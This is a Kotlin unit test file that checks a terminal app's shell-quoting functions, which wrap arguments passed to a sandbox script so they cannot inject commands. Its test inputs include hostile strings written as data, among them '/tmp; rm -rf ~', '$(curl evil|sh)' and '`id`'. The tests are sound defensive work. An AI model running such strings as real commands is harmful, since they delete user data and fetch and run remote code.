package com.rk.terminal

import com.google.common.truth.Truth.assertThat
import org.junit.Test

/**
 * Pins the quoting used when a command is handed to `sandbox.sh`.
 *
 * A sandboxed command is launched as `sh -c <sandbox.sh> <command line>`, and sandbox.sh in turn
 * does `exec ... bash -i -c "$*"`. `bash -c` takes exactly one string, so argv has to be joined
 * *somewhere*. Joining it without quoting means `exe = "ls"`, `args = ["/tmp; rm -rf ~"]` becomes
 * the shell source `ls /tmp; rm -rf ~`.
 *
 * It also silently dropped `exe` altogether: `sh -c script.sh exe a b` sets `$0` to `exe` and the
 * positional parameters to `a b`, so `$*` was `a b` and `exe` never reached bash at all.
 *
 * The production change these tests catch: removing the quoting, or switching to a different
 * quote character (`"` would still expand `$`, backticks and `\`).
 */
class ShellQuotingTest {

    @Test
    fun `a plain word survives quoting`() {
        assertThat(shellQuote("ls")).isEqualTo("'ls'")
    }

    @Test
    fun `a word with a space stays one word`() {
        assertThat(shellQuote("My Drive")).isEqualTo("'My Drive'")
    }

    @Test
    fun `a command separator cannot escape the quotes`() {
        assertThat(shellQuote("/tmp; rm -rf ~")).isEqualTo("'/tmp; rm -rf ~'")
    }

    @Test
    fun `an embedded single quote is closed escaped and reopened`() {
        assertThat(shellQuote("it's")).isEqualTo("'it'\\''s'")
    }

    @Test
    fun `command substitution is inert inside single quotes`() {
        assertThat(shellQuote("\$(curl evil|sh)")).isEqualTo("'$(curl evil|sh)'")
    }

    @Test
    fun `backticks are inert inside single quotes`() {
        assertThat(shellQuote("`id`")).isEqualTo("'`id`'")
    }

    @Test
    fun `a leading dash stays a value and not an option`() {
        assertThat(shellQuote("-rf")).isEqualTo("'-rf'")
    }

    @Test
    fun `an empty argument is preserved`() {
        assertThat(shellQuote("")).isEqualTo("''")
    }

    @Test
    fun `a newline stays inside the quotes`() {
        assertThat(shellQuote("a\nb")).isEqualTo("'a\nb'")
    }

    @Test
    fun `a command line quotes every part and keeps order`() {
        assertThat(shellCommandLine(arrayOf("ls", "-l", "/tmp/My Drive")))
            .isEqualTo("'ls' '-l' '/tmp/My Drive'")
    }

    @Test
    fun `an empty command line is empty`() {
        assertThat(shellCommandLine(emptyArray())).isEmpty()
    }

    @Test
    fun `a full command line is not executable as written`() {
        // The round trip that matters: joined unquoted, this string would delete $HOME.
        val line = shellCommandLine(arrayOf("ls", "/tmp; rm -rf ~"))

        assertThat(line).doesNotContain("; rm -rf ~'")
        assertThat(line).isEqualTo("'ls' '/tmp; rm -rf ~'")
    }
}